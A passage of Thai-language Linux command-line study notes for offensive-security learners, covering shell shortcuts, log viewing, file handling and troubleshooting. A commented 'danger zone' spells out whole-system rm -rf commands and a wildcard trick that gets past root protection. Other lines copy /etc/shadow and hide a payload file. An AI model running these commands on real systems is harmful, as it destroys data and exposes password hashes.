| `Ctrl + U` | ตัด (Kill) ข้อความทั้งหมดตั้งแต่ตำแหน่งเคอร์เซอร์ย้อนไปจนถึงต้นบรรทัด |
| `Ctrl + K` | ตัด (Kill) ข้อความทั้งหมดตั้งแต่ตำแหน่งเคอร์เซอร์ไปจนสุดปลายบรรทัด |
| `Ctrl + W` | ตัด (Kill) คำศัพท์คำก่อนหน้า 1 คำ (ตัดก้อนใหญ่ตามช่องว่าง Whitespace) |
| `Alt + Backspace` | ตัด (Kill) คำศัพท์คำก่อนหน้าแบบละเอียด (ตัดตามขอบเขตอักขระพิเศษ เช่น `/` หรือ `-` เหมาะสำหรับแก้ Path) |
| `Ctrl + Y` | แปะ/ดึงคืน (Yank) ข้อความล่าสุดที่เพิ่งตัดด้วย Ctrl + U/K/W หรือ Alt + Backspace กลับมาวางที่ตำแหน่งเคอร์เซอร์ |
| `!!` | ดึงคำสั่งล่าสุดทั้งบรรทัดกลับมารันซ้ำ (เทคนิคยอดฮิต: `sudo !!` เมื่อลืมใส่ sudo) |
| `!$` | ดึง Argument ตัวสุดท้ายของคำสั่งก่อนหน้ามาใช้งานทันที (เช่น `mkdir test` ➔ `cd !$`) |
| `Ctrl + X` ตามด้วย `Ctrl + E` | เปิด Text Editor (เช่น nano/vim) เพื่อเขียนคำสั่งแบบหลายบรรทัด เมื่อเซฟแล้วจะสั่งรันทันที |

### 💻 Navigation, Paging & Custom Aliases Setup
```bash
# ทางลัดเคลื่อนย้ายไดเรกทอรีความเร็วสูง (Navigation Ergonomics)
cd                              # กลับสู่ Home Directory ทันทีโดยไม่ต้องพิมพ์ Path (ดึงค่าจากตัวแปร $HOME)
cd -                            # สลับกลับไปยังไดเรกทอรีล่าสุดที่เพิ่งจากมาทันที (ดึงค่าจากตัวแปร $OLDPWD)
cd ../../..                     # ซ้อนโซ่ Relative Path ถอยรวดเดียว 3 ระดับ (ต่อยอดจาก cd .. และ cd ../.. ใน Module 01)

# ตรวจสอบไฟล์ขนาดใหญ่และมอนิเตอร์ล็อกไฟล์ (File Inspection & Live Log Streaming)
less /var/log/auth.log          # เปิดอ่านไฟล์ทีละหน้าแบบ Interactive (ค้นหาด้วย /, ออกด้วย q ไม่ทำให้ Terminal ค้าง)
less +F /var/log/syslog         # สตรีมข้อมูลเรียลไทม์ด้วย less (กด Ctrl+C เพื่อหยุดค้นหาย้อนหลัง, กด Shift+F เพื่อสตรีมต่อ)
tail -n 20 /var/log/auth.log    # ส่องเฉพาะ 20 บรรทัดท้ายสุดของไฟล์ (Default หากไม่ระบุ -n คือ 10 บรรทัด)
tail -f /var/log/auth.log       # สตรีมล็อกสดตาม File Descriptor (เหมาะสำหรับไปป์คำสั่ง เช่น | grep -i failed)
tail -F /var/log/auth.log       # สตรีมล็อกสดตามชื่อไฟล์ + Retry (ทนทานต่อ Logrotate แม้ไฟล์ถูกตัดสลับชื่อก็ไม่หลุด)

# การใช้งาน History Expansions (เทคนิคประหยัดเวลาพิมพ์)
sudo !!                         # นำคำสั่งก่อนหน้าที่ลืมใส่ sudo กลับมารันซ้ำด้วยสิทธิ์ root ทันที (Bang-Bang)
mkdir -p /opt/tools/recon && cd !$ # !$ ดึง Argument ตัวสุดท้าย (/opt/tools/recon) จากคำสั่งก่อนหน้ามาใช้ต่อทันที

# เปิดไฟล์ Config ของ Shell เพื่อตั้งค่าคีย์ลัดถาวร (Zsh บน Kali หรือ Bash บน Ubuntu)
nano ~/.zshrc                   # สำหรับ Kali Linux ยุคใหม่ (Default Shell = Zsh)
nano ~/.bashrc                  # สำหรับ Ubuntu / Debian ทั่วไป (Default Shell = Bash)

# เพิ่ม Aliases ยอดนิยมสำหรับงาน OffSec ในชีวิตประจำวัน
alias ll='ls -lah --color=auto' # รวม -l (Long) + -a (All) + -h (Human-readable sizes เช่น KB/MB) ในคำสั่งเดียว
alias update='sudo apt update && sudo apt upgrade -y'
alias ports='netstat -tulpn'
alias myip='ip -br -c a'

# โหลด Config ให้มีผลทันทีในเซสชันปัจจุบันโดยไม่ต้องปิดเปิด Terminal ใหม่
source ~/.zshrc                 # หรือพิมพ์ . ~/.zshrc
```

### 🧠 Feynman Takeaway & Reflection
#### 💡 แก่นความคิดและกลไกสำคัญ (Core Mental Models)
1. **จิตวิทยาและสรีรวิทยาของ History Navigation (ลูกศรขึ้น/ลง vs `Ctrl + R`):**
   - **ลูกศรขึ้น (`↑`) / ลง (`↓`):** ออกแบบมาสำหรับการเรียกคำสั่งใกล้ตัว (Recency) ที่เพิ่งพิมพ์ไปเมื่อไม่กี่วินาทีก่อน โดย Shell จะดึงจาก History Buffer ใน RAM มาแสดงผลทีละบรรทัด
   - **ศาสตร์แห่ง `Ctrl + R` (Reverse Incremental Search):** ออกแบบมาสำหรับค้นหาคำสั่งในอดีตระยะไกล (Deep History Search) โดยไม่ต้องกดลูกศรขึ้นร้อยรอบ
   - **วงจรปฏิบัติการ 4 จังหวะของ `Ctrl + R` (Pro Workflow):**
     1. **เรียกใช้งาน (Trigger):** กด `Ctrl + R` พรอมต์จะเปลี่ยนเป็น `(reverse-i-search)` พร้อมรอรับคีย์เวิร์ด
     2. **พิมพ์คำค้นหา (Type Query):** พิมพ์เฉพาะคำสำคัญบางส่วน เช่น `nmap` หรือ `ssh` ตัว Shell จะดึงคำสั่งล่าสุดที่ตรงกับคำนี้ขึ้นมาแสดงทันที
     3. **วนหาคำสั่งที่เก่ากว่า (Cycle Matches):** หากคำสั่งที่แสดงยังไม่ใช่ตัวที่ต้องการ **ให้กด `Ctrl + R` ซ้ำไปเรื่อยๆ** ตัว Shell จะกระโดดถอยหลังไปหาคำสั่งก่อนหน้านั้นที่ตรงกับคำค้นหาทีละรายการ
     4. **ตัดสินใจสั่งการ (Action Gate):**
        - **กด `Enter`:** สั่งรันคำสั่งที่เลือกทันที
        - **กด `Tab` หรือ ลูกศรขวา (`→`):** ดึงคำสั่งนั้นมาวางบนหน้าจอ Terminal เพื่อแก้ไข (เช่น เปลี่ยน IP ปลายทาง) ก่อนสั่งรัน
        - **กด `Ctrl + G` หรือ `Ctrl + C`:** ยกเลิกการค้นหาและปิดหน้าต่างค้นหาทิ้งทันที โดยไม่รันและไม่ทิ้งรอยใดๆ
2. **เบื้องหลังทางสถาปัตยกรรมของ `cd`, `cd -`, และ `cd ../../..`:**
   - **ทำไมพิมพ์ `cd` เปล่าๆ ถึงกลับ Home (`/home/<user>` หรือ `/root`):** คำสั่ง `cd` เป็น Shell Built-in Command ที่มีกลไกตรวจสอบว่า หากผู้ใช้ไม่ได้ระบุพารามิเตอร์ปลายทาง มันจะวิ่งตรงไปยังตำแหน่งที่ระบุไว้ใน Environment Variable **`$HOME`** อัตโนมัติ (เช่น `/home/kali`)
   - **ความลับของ `cd -` (The `$OLDPWD` Variable):** ทุกครั้งที่เรารันคำสั่งเปลี่ยนไดเรกทอรี ตัว Shell จะบันทึกตำแหน่งก่อนหน้าเก็บไว้ในตัวแปรระบบชื่อ **`$OLDPWD`** เสมอ ดังนั้นคำสั่ง `cd -` จึงเทียบเท่ากับการสั่ง `cd "$OLDPWD"` เสมือนการกดปุ่ม Back ในเบราว์เซอร์ เพื่อสลับไปมาระหว่างสองโฟลเดอร์ลึกๆ ได้ในเสี้ยววินาที
   - **ตรรกะการถอยหลังด้วย Relative Path (`..` vs `../..` vs `../../..`):** อักขระ `..` หมายถึง Parent Directory 1 ขั้น สามารถนำมาเรียงต่อกันเป็นห่วงโซ่ผ่านเครื่องหมายสแลช (`/`) ได้ไม่จำกัดชั้นตามความลึกจริงของโฟลเดอร์ เช่น ยืนอยู่ที่ `/var/www/html/app/static` หากสั่ง `cd ../../..` จะกระโดดถอยรวดเดียว 3 ชั้นกลับมาโผล่ที่ `/var/www/` ทันที
3. **การประหยัดพลังงานสมองด้วย History Expansions (`!!` และ `!$`):**
   - **`!!` (Bang-Bang):** สั่งรันคำสั่งก่อนหน้าซ้ำทั้งบรรทัด มีประโยชน์สูงสุดในจังหวะพิมพ์คำสั่งยาวๆ แล้วลืมใส่ `sudo` ให้พิมพ์เพียง `sudo !!` ระบบจะเติม sudo ให้คำสั่งเดิมและสั่งรันทันที
   - **`!$` (Bang-Dollar):** ดึงเฉพาะอาร์กิวเมนต์ตัวสุดท้ายของคำสั่งก่อนหน้ามาใช้งาน ช่วยป้องกันการพิมพ์ชื่อไฟล์หรือ Path ยาวๆ ซ้ำ เช่น `mkdir -p /opt/tools/recon` ตามด้วย `cd !$`
4. **กลไกความคงทนของ Shell Aliases (Session vs Persistence):**
   - หากพิมพ์ `alias c='clear'` ในหน้าต่าง Terminal คำสั่งจะใช้งานได้เฉพาะในเซสชันนั้น และจะหายไปทันทีเมื่อปิดหน้าจอ
   - การทำให้คงทน (Persistence) ต้องเขียนลงไฟล์คอนฟิกเริ่มต้นของ Shell (`~/.zshrc` หรือ `~/.bashrc`) และสั่ง **`source <file>`** เพื่อให้ Shell อ่านและโหลดค่าเข้าสู่หน่วยความจำของเซสชันปัจจุบันทันทีโดยไม่ต้องเปิด Terminal ใหม่
5. **ทำไม Copy/Paste ใน Terminal ต้องกด Shift (`Ctrl + Shift + C / V`):**
   - ใน GUI ทั่วไป ปุ่มคัดลอกและวางคือ `Ctrl + C` และ `Ctrl + V`
   - แต่ในสถาปัตยกรรม Terminal ของ Linux: ปุ่ม **`Ctrl + C` ถูกสงวนไว้ตามมาตรฐาน POSIX สำหรับส่งสัญญาณขัดจังหวะเคอร์เนล `SIGINT` (Signal 2)** เพื่อฆ่าโปรเซสทิ้ง และ `Ctrl + V` ถูกจองไว้สำหรับพิมพ์อักขระพิเศษ (Literal Next Character)
   - ตัวจำลองเทอร์มินัล (Terminal Emulators) จึงต้องเพิ่มปุ่ม **`Shift`** เข้ามาคั่น เพื่อแยกคำสั่งจัดการคลิปบอร์ดออกจากคำสั่งควบคุมโปรเซสของระบบปฏิบัติการอย่างเด็ดขาด (ทริกเสริม: สามารถไฮไลต์ข้อความด้วยเมาส์ แล้วกดคลิกลูกกลิ้งกลางเมาส์ (Middle Click) เพื่อวางได้ทันที)
6. **ศาสตร์แห่ง Readline Kill Ring: คอมโบ `Ctrl + U / K / W` / `Alt + Backspace` + `Ctrl + Y` (Yank):**
   - **คำว่า "Kill" ในโลก Terminal คือการตัด (Cut) ไม่ใช่การลบทิ้งถาวร:** เมื่อเรากด `Ctrl + U` (ตัดย้อนไปต้นบรรทัด), `Ctrl + K` (ตัดไปท้ายบรรทัด), `Ctrl + W` (ตัดคำก่อนหน้า) หรือ `Alt + Backspace` ข้อความเหล่านั้นไม่ได้หายไปในอากาศ แต่ถูกเก็บไว้ในบัฟเฟอร์หน่วยความจำพิเศษชื่อ **Kill Ring** ของระบบ Readline
   - **ศึกแห่งการลบคำ: `Ctrl + W` vs `Alt + Backspace`:**
     - สมมติกำลังพิมพ์ Path ยาวๆ: `/var/www/html/`
     - **กด `Ctrl + W`:** ตัดตามช่องว่าง (Whitespace) เมื่อไม่มีเว้นวรรค มันจะกวาดลบพาธทิ้งทั้งยวง `/var/www/html/` หายเกลี้ยง
     - **กด `Alt + Backspace`:** ตัดตามขอบเขตของอักขระพิเศษ (เช่น `/`, `-`, `_`) ทำให้ถอยลบทีละโฟลเดอร์ได้อย่างแม่นยำ เช่น กดครั้งแรกตัดเฉพาะ `html/` (เหลือ `/var/www/`) กดอีกทีตัด `www/` (เหลือ `/var/`)
   - **`Ctrl + Y` (Yank):** ในศัพท์ดั้งเดิมของ Emacs/Readline คำว่า "Yank" หมายถึงการดึงข้อความที่เพิ่งตัดไปกลับมาแปะวาง (Paste) ตรงตำแหน่งที่เคอร์เซอร์ยืนอยู่
   - **ยุทธวิธีจริงในการทำงาน (Temporary Shelving):**
     - หากกำลังพิมพ์คำสั่งยาวๆ อยู่ (เช่น คำสั่ง Nmap หรือ Reverse Shell สังเคราะห์ยาวเหยียด) แต่นึกขึ้นได้ว่า "ลืมเช็ก IP เครื่องตัวเอง หรือลืมเปิดเซิร์ฟเวอร์ดักรอรับการเชื่อมต่อ"
     - **หากกด `Ctrl + C`:** คำสั่งที่อุตส่าห์พิมพ์มาอย่างยาวจะถูกยกเลิกและหายสาบสูญ ต้องพิมพ์ใหม่ตั้งแต่ต้น
     - **วิธีระดับเทพ (Pro Workflow):** กด **`Ctrl + U`** ทันที เพื่อ "ตัด" คำสั่งทั้งยวงไปฝากไว้ใน Kill Ring ➔ หน้าจอจะว่างสะอาด ➔ พิมพ์เช็ก `ip a` หรือรันสคริปต์สั้นๆ ให้เสร็จ ➔ ขึ้นบรรทัดใหม่ว่างๆ แล้วกด **`Ctrl + Y`** ปั๊บ! คำสั่งยาวเหยียดจะเด้งกลับมาวางที่เดิมทันทีโดยไม่ต้องพิมพ์ซ้ำแม้แต่ตัวเดียว
7. **อาวุธลับสาย Pro: `Ctrl + X` ตามด้วย `Ctrl + E` (Edit and Execute Command):**
   - **ปัญหาของการพิมพ์คำสั่งยาวๆ บน Terminal:** เมื่อต้องเขียนคำสั่งซับซ้อน เช่น Bash One-liner ลูป `for ip in $(cat target.txt); do nmap ...; done` การเลื่อนเคอร์เซอร์แก้ข้อความบนบรรทัดเดียวเป็นเรื่องยากลำบาก
   - **กลไกการทำงาน:** เมื่อกด **`Ctrl + X` แล้วตามด้วย `Ctrl + E`** ตัว Shell จะเปิดโปรแกรม Text Editor ประจำระบบ (ตามที่ตั้งไว้ในตัวแปร `$EDITOR` เช่น nano หรือ vim) ขึ้นมาเต็มหน้าจอ พร้อมยกคำสั่งที่เราพิมพ์ค้างอยู่ไปเปิดใน Editor ทันที
   - **เวิร์กโฟลว์ปฏิบัติการ:**
     1. เราสามารถเคาะขึ้นบรรทัดใหม่ เขียนเป็นสคริปต์หลายบรรทัด ตรวจสอบไวยากรณ์ หรือก๊อปปี้วางได้อย่างอิสระ
     2. **เมื่อกด Save และ Exit ออกมา:** ตัว Shell จะ **ประมวลผลและรันคำสั่งก้อนนั้นใน Terminal ทันทีโดยอัตโนมัติ!**
     3. **หากเปลี่ยนใจไม่ต้องการรัน:** เพียงลบข้อความทั้งหมดใน Editor ให้ว่างเปล่า แล้วสั่ง Exit ออกมา ตัว Shell จะยกเลิกการรันโดยไม่เกิดอะไรขึ้น
8. **ยุทธวิธีการอ่านไฟล์ขนาดใหญ่และสตรีมล็อก: `cat` vs `less` vs `tail` (ไขปริศนา `f` เล็ก vs `F` ใหญ่):**
   - **ข้อผิดพลาดร้ายแรงของ `cat` กับไฟล์ยักษ์/ล็อกไฟล์:** คำสั่ง `cat` จะพ่นข้อมูลทั้งไฟล์ออกมาที่หน้าจอ Terminal ในรวดเดียว หากนำไปใช้กับไฟล์ล็อกขนาดหลายกิกะไบต์หรือไฟล์ Wordlist จะทำให้ Terminal ค้าง ท่วมทับ Scrollback Buffer และไม่สามารถเลื่อนดูข้อมูลได้
   - **พลังของ `less` (Lazy Loading Pager):** โหลดเฉพาะเนื้อหาส่วนที่กำลังแสดงบนหน้าจอ ทำให้เปิดไฟล์ขนาด 10 GB ได้ทันทีโดยไม่กิน RAM สามารถเลื่อนขึ้น/ลง (`j`/`k`), ค้นหาคำด้วยเครื่องหมาย `/` (กด `n` เพื่อหาคำถัดไป), และเมื่อกด `q` หน้าจอจะกลับมาสะอาดทันที
   - **ความแตกต่างระหว่าง `f` เล็ก vs `F` ใหญ่ ในคำสั่ง `tail` (ศึก Log Rotation):**
     - **`tail -f` (Follow Descriptor):** เกาะติดตามความเคลื่อนไหวผ่าน File Descriptor ของไฟล์ ณ ขณะนั้น หากระบบมีการตัดรอบล็อก (Logrotate) เช่น เปลี่ยนชื่อ `auth.log` เป็น `auth.log.1` แล้วสร้าง `auth.log` ใหม่ ตัว `tail -f` จะยังคงตามอ่านไฟล์เก่าที่ถูกเปลี่ยนชื่อไปแล้ว ทำให้มองไม่เห็นข้อมูลล็อกใหม่ที่กำลังถูกเขียนลงไฟล์จริง
     - **`tail -F` (Follow Name + Retry):** เกาะติดตามโดย "อ้างอิงชื่อไฟล์ (Filename)" หากเกิดการ Logrotate หรือไฟล์ถูกลบแล้วสร้างขึ้นมาใหม่ `tail -F` จะไม่หลุด แต่จะ Retry และ Reopen กลับมาเกาะอ่านไฟล์ใหม่ที่มีชื่อเดิมโดยอัตโนมัติ จึงเป็นมาตรฐานสูงสุดในงาน Monitor เซิร์ฟเวอร์จริง
   - **ไขความกระจ่างในคำสั่ง `less`: ทำไมต้องใช้ `+F` และความหมายของ `f` เล็ก vs `F` ใหญ่:**
     - **เครื่องหมายบวก `+` ใน `less`:** เครื่องหมาย `+` คือการสั่งให้ `less` รันคำสั่ง Interactive นั้นทันทีที่เปิดไฟล์ขึ้นมา ดังนั้นคำสั่ง **`less +F`** (สังเกตเครื่องหมายบวก) คือการสั่งให้เปิดไฟล์แล้วเข้าสู่โหมด Follow (`F`) ทันที
     - **อย่าสับสนกับเครื่องหมายลบ (`-`):** หากพิมพ์ `less -F` (ลบ F ใหญ่) จะหมายถึง `--quit-if-one-screen` (ถ้าเนื้อหาไฟล์สั้นกว่า 1 หน้าจอ ให้พ่นออกแล้วปิดโปรแกรมทันทีเหมือน `cat` ไม่ใช่การสตรีม) และ `less -f` (ลบ f เล็ก) คือ `--force` บังคับเปิดไฟล์พิเศษ
     - **ปุ่มควบคุมภายใน `less`:** 
       - กด **`f` (ตัวเล็ก):** เลื่อนไปข้างหน้า 1 หน้าจอ (Forward one screen)
       - กด **`Shift + F` (F ตัวใหญ่):** สั่งให้เข้าสู่โหมด Follow สตรีมข้อมูลเรียลไทม์
   - **ยุทธวิธีเลือกระหว่าง `tail -f/-F` vs `less +F` ในงานความมั่นคงปลอดภัย:**
     - **ใช้ `tail -f` / `tail -F`:** เมื่อต้องการส่งข้อมูลต่อไปป์ (Pipe) เช่น `tail -f /var/log/auth.log | grep --line-buffered "Failed password"` หรือเปิดมอนิเตอร์ทิ้งไว้ในจอ Terminal ด้านข้าง
     - **ใช้ `less +F`:** เมื่อต้องการสืบสวนสอบสวนแบบ Interactive (Incident Response) เพราะเมื่อเห็นบรรทัดล็อกการโจมตีที่น่าสงสัย สามารถกด **`Ctrl + C`** เพื่อหยุดสตรีมชั่วคราว (โดยไม่ปิดโปรแกรม) แล้วเลื่อนลูกศรขึ้นไปอ่าน หรือกด `/` ค้นหาย้อนหลังเพื่อดูพฤติกรรมก่อนหน้าของแฮกเกอร์ได้อย่างละเอียด เมื่อวิเคราะห์เสร็จ กด **`Shift + F`** เพื่อกลับเข้าสู่โหมดสตรีมสดต่อได้ทันที

#### ⚠️ กับดักทางเทคนิคและข้อควรระวัง (Gotchas & Pitfalls)
1. **ข้อควรระวังในการตั้ง Alias:** อย่าตั้ง Alias ทับชื่อคำสั่งระบบที่มีอยู่เดิมโดยไม่จำเป็น (เช่น อย่าตั้ง `alias cd=...` หรือ `alias rm=...` ที่อาจเปลี่ยนพฤติกรรมคำสั่งมาตรฐานจนส่งผลกระทบต่อสคริปต์ระบบ)
2. **ความเชื่อมโยงกับ Module 01:** ใน Module 01 มีการแนะนำพื้นฐานคำสั่ง `cd ..` และ `cd ../..` (ถอย 2 ระดับ) ไปแล้ว ใน Module 09 นี้คือการต่อยอดเชิงลึกสู่มิติความเร็วสูงสุด (Speed & Ergonomics) ทั้งการต่อโซ่ `../../..`, การใช้ตัวแปร `$OLDPWD` ผ่าน `cd -`, และการกลับบ้านผ่าน `$HOME` ด้วย `cd` เปล่า เพื่อให้เห็นภาพรวมของระบบนำทางอย่างแท้จริง

---

## Module 10: System Diagnostic Breakdown & Recovery
- **Status:** ✅ Completed
- **Core Concept:** การรับมือเมื่อระบบเกิดปัญหา: การอ่าน System Logs, ตรวจสอบพื้นที่ดิสก์เต็ม, การแก้ปัญหา Network และการใช้ VirtualBox Snapshot ย้อนเวลาระบบ

### 📝 Key Notes & Mindset
- วิศวกรสาย Security ต้องไม่กลัวระบบพัง แต่ต้องมีทักษะในการอ่าน Log เพื่อหาสาเหตุที่แท้จริง (Root Cause Analysis)
- ระบบ Linux ไม่เคยโกหก ทุกความผิดพลาดมีการทิ้งร่องรอยไว้ใน System Logs และ Exit Codes เสมอ

### 💻 Essential Commands
```bash
# การสร้างไฟล์ทดสอบและปรับปรุงเวลา Timestamp (Touch Diagnostics)
touch file1                     # สร้างไฟล์เปล่าขนาด 0 byte หรืออัปเดต timestamp หากไฟล์มีอยู่แล้ว
touch file1 file2 file3         # สร้างไฟล์เปล่าหลายไฟล์พร้อมกันในคำสั่งเดียวผ่าน Argument list
touch file{1..10}               # ทริกขั้นสูง: ใช้ Brace Expansion สร้างไฟล์ file1 ถึง file10 รวดเดียว

# การสร้างไดเรกทอรีเดี่ยว หลายโฟลเดอร์ และโครงสร้างซ้อนลึก (mkdir Architecture)
mkdir dir1                            # สร้างไดเรกทอรีเดี่ยวในตำแหน่งปัจจุบัน
mkdir dir1 dir2 dir3                  # สร้างหลายไดเรกทอรีพร้อมกันในคำสั่งเดียวผ่าน Argument list
mkdir -p target/{nmap,web,scans,loot} # สร้างโฟลเดอร์แบบ Recursive (-p) ร่วมกับ Brace Expansion สำหรับโครงสร้างงาน Recon
mkdir -m 700 /tmp/.secret_stash       # สร้างโฟลเดอร์พร้อมกำหนดสิทธิ์ (rwx------) ทันทีตั้งแต่เกิด ป้องกันผู้อื่นแอบอ่าน
for i in {1..1500}; do mkdir -p "./$i/sub1/sub2/sub3"; done # สคริปต์ลูป Bash สร้างโฟลเดอร์ซ้อนลึก 1,500 สาย จำลองโครงสร้างไฟล์ขนาดใหญ่เพื่อ Stress-Test

# การเขียนข้อความบรรทัดเดียวอย่างรวดเร็ว (echo Redirection: Overwrite vs Append)
echo "Hello Hackers" > file.txt       # เขียนข้อความทับลงไฟล์ (หากไม่มีไฟล์จะสร้างใหม่ให้อัตโนมัติ)
echo "Second line" >> file.txt        # เขียนข้อความต่อท้ายไฟล์เดิม (Append) โดยไม่ลบของเก่า
echo -n "admin_token_hash" > token    # แฟล็ก -n ตัด newline (\n) ทิ้ง (เหมาะสำหรับเขียน Hash, Key หรือ Password)

# การสร้างและเขียนเนื้อหาลงไฟล์ทันทีโดยไม่ต้องเปิด Text Editor (cat Stdin & Heredoc)
cat > note.txt                        # เขียนไฟล์แบบ Interactive รับค่าจากคีย์บอร์ด เมื่อพิมพ์เสร็จกด Ctrl + D เพื่อบันทึก (EOF)
cat >> note.txt                       # เขียนข้อความต่อท้ายไฟล์เดิม (Append) โดยไม่ลบของเก่า แล้วกด Ctrl + D เพื่อตัดจบ

# การเขียนสคริปต์ด้วย Heredoc แบบแทนที่ตัวแปร (Unquoted EOF - Variable Evaluated)
cat << EOF > dynamic.sh
echo "Generated for: $USER at $(date)"
EOF

# การเขียนสคริปต์/เพย์โหลดด้วย Heredoc แบบปิดการแทนที่ตัวแปร (Quoted 'EOF' - Raw Literal Text)
cat << 'EOF' > exploit.sh
#!/bin/bash
TARGET_IP=$1                          # ตัวแปร $1 และ $USER จะถูกคงรูปเดิมไว้ ไม่ถูก Shell ปัจจุบันกลืนกิน
echo "Attacking target: $TARGET_IP"
EOF

cat << CAT > catcat.txt               # คำปิดท้าย (Delimiter) ตั้งเป็นคำใดก็ได้ตามต้องการ เช่น CAT
content
CAT

# การเคลื่อนย้ายและเปลี่ยนชื่อไฟล์ (mv Command: Rename vs Relocate)
mv oldname.txt newname.txt            # เปลี่ยนชื่อไฟล์ในไดเรกทอรีเดิม (Rename)
mv file.txt /tmp/                     # ย้ายไฟล์ไปยังไดเรกทอรีปลายทาง (Move)
mv file.txt /tmp/newname.txt          # ย้ายตำแหน่งและเปลี่ยนชื่อใหม่ไปพร้อมกันในคำสั่งเดียว
mv file1 file2 file3 /tmp/target_dir/ # ย้ายหลายไฟล์พร้อมกันไปยังโฟลเดอร์ปลายทาง
mv -i file.txt destination.txt        # แฟล็ก -i (Interactive) ถามยืนยันก่อนเขียนทับ ป้องกันการเผลอลบไฟล์ปลายทางโดยไม่รู้ตัว
mv payload.sh .payload.sh             # ยุทธวิธี OffSec: เติมจุด (.) หน้าชื่อไฟล์เพื่อซ่อนไฟล์จากการส่องด้วย ls ธรรมดา

# การคัดลอกไฟล์และไดเรกทอรี (cp Command: Path vs Rename vs Recursive)
cp test.txt ./name/                   # คัดลอกไฟล์ไปวางในโฟลเดอร์ name โดยคงชื่อเดิมไว้ (ได้ ./name/test.txt)
cp test.txt ./name/new.txt            # คัดลอกไฟล์ไปวางในโฟลเดอร์ name พร้อมเปลี่ยนชื่อใหม่ (ได้ ./name/new.txt)
cp file1 file2 file3 ./backup/        # คัดลอกหลายไฟล์พร้อมกันเข้าไปยังโฟลเดอร์ปลายทาง
cp -r ./project /tmp/backup/          # แฟล็ก -r คัดลอกไดเรกทอรีและไฟล์ย่อยทั้งหมดแบบ Recursive
cp -a /etc/shadow /tmp/shadow.bak     # แฟล็ก -a (Archive) คัดลอกแบบรักษาสิทธิ์ เจ้าของ และ Timestamp เดิมไว้ 100%

# การแสดงผลโครงสร้างไฟล์แบบผังต้นไม้ (Directory Tree Visualization)
tree                                  # วาดแผนผังโฟลเดอร์และไฟล์ทั้งหมดจากตำแหน่งปัจจุบันลงไปแบบ Recursive
tree -L 2                             # แฟล็ก -L กำหนดความลึกไม่เกิน 2 ระดับชั้น (ป้องกัน Terminal ค้างจากไฟล์มหาศาล)
tree -d                               # แฟล็ก -d กรองแสดงเฉพาะไดเรกทอรี (ซ่อนไฟล์ธรรมดาทั้งหมด)
tree -a                               # แฟล็ก -a แสดงไฟล์ซ่อนและโฟลเดอร์ซ่อนทั้งหมด (.git, .env)
tree -phu                             # แสดงข้อมูลครบเครื่อง: -p (Permissions), -h (Human sizes), -u (Owner)
tree -I "node_modules|.git|venv"      # แฟล็ก -I (Ignore) คัดกรองโฟลเดอร์ขยะขนาดใหญ่ออกจากการแสดงผล

# การลบไฟล์และไดเรกทอรีอย่างปลอดภัยและหมดจด (rm & rmdir Deletion Architecture)
rm file1                              # ลบไฟล์เดี่ยว 1 ไฟล์ (ระวัง: บน Linux CLI ไม่มีถังขยะ Recycle Bin)
rm file1 file2 file3                  # ลบหลายไฟล์พร้อมกันในคำสั่งเดียวผ่าน Argument list
rm -i file.txt                        # แฟล็ก -i (Interactive) บังคับให้ถามยืนยันก่อนลบ (y/n) ป้องกันการลบผิด
rmdir emptydir/                       # ลบเฉพาะไดเรกทอรีที่ "ว่างเปล่า" เท่านั้น (หากมีไฟล์ข้างในระบบจะปฏิเสธทันที)
rm -r namedir/                        # แฟล็ก -r (Recursive) ลบไดเรกทอรีพร้อมไฟล์และโฟลเดอร์ย่อยข้างในทั้งหมด
rm -rf namedir/                       # แฟล็ก -rf (Recursive + Force) บังคับลบทั้งยวงโดยไม่ถามเตือนและไม่สนสิทธิ์ Read-only

# ⚠️ โซนอันตรายสูงสุด (Extreme Danger Zone - ห้ามรันบนระบบจริงเด็ดขาด)
# sudo rm -rf /                            # GNU Coreutils ป้องกันไว้ด้วย --preserve-root (ระบบจะปฏิเสธการรัน)
# sudo rm -rf --no-preserve-root /         # ปลดสลักนิรภัย บังคับลบทั้งระบบ ทำลายล้าง OS และเสี่ยงทำลาย Motherboard UEFI NVRAM
# sudo rm -rf /*                           # ช่องโหว่ Wildcard Bypass: Shell คลี่ /* กลายเป็น /bin /etc /usr ข้ามการบล็อกของ --preserve-root

# ส่อง Log กิจกรรมระบบและ Error ล่าสุด
sudo tail -f /var/log/syslog
sudo tail -f /var/log/auth.log        # ส่องดูการพยายาม Login และการใช้ Sudo
sudo journalctl -xe                  # ส่อง Log ข้อผิดพลาดของ Systemd Services เชิงลึกพร้อมคำอธิบายสาเหตุ

# ตรวจสอบพื้นที่จัดเก็บของฮาร์ดดิสก์ทั้งหมด
df -h

# ค้นหาว่าโฟลเดอร์หรือไฟล์ใดกินพื้นที่ในเครื่องมากที่สุด และการกู้พื้นที่
du -sh /* 2>/dev/null | sort -h
sudo truncate -s 0 /var/log/syslog    # ล้างขนาดไฟล์ Log ที่บวมเป็น 0 byte ทันทีโดยไม่ต้องลบไฟล์ (คืนพื้นที่ดิสก์ปลอดภัย)

# ซ่อมแซมแพ็กเกจที่เสียหายหรือค้างระหว่างติดตั้ง
sudo apt --fix-broken install
sudo dpkg --configure -a

# ตรวจสอบการเชื่อมต่อเครือข่ายและการตั้งค่า DNS
ip a
ping -c 4 8.8.8.8
cat /etc/resolv.conf
```

### 🧠 Feynman Takeaway & Reflection
#### 💡 แก่นความคิดและกลไกสำคัญ (Core Mental Models)
1. **การสร้างไฟล์ทดสอบแบบเดี่ยวและแบบกลุ่ม (`touch` & Multi-file Generation):**
   - **`touch <file>`:** เครื่องมือที่รวดเร็วที่สุดในการสร้างไฟล์เปล่า (0-byte dummy file) สำหรับใช้ทดสอบระบบหรือทดสอบสิทธิ์
   - **`touch file1 file2 file3 ...`:** คำสั่ง `touch` รองรับพารามิเตอร์แบบไม่จำกัดจำนวน (Variadic Arguments) คั่นด้วยช่องว่าง ทำให้สามารถสร้างไฟล์หลายไฟล์พร้อมกันในไดเรกทอรีปัจจุบันได้ในเสี้ยววินาที
   - **ทริกเสริมด้วย Shell Brace Expansion (`touch file{1..10}`):** แทนที่จะพิมพ์ชื่อไฟล์ซ้ำๆ ตัว Shell สามารถขยายช่วงตัวเลข `{1..10}` หรือตัวอักษร `{a..z}` ให้เป็นชุดอาร์กิวเมนต์อัตโนมัติ ช่วยสร้างไฟล์ทดสอบจำนวนมากได้อย่างรวดเร็ว
2. **ตัวตนที่แท้จริงของ `touch` (Timestamp Manipulation Engine):**
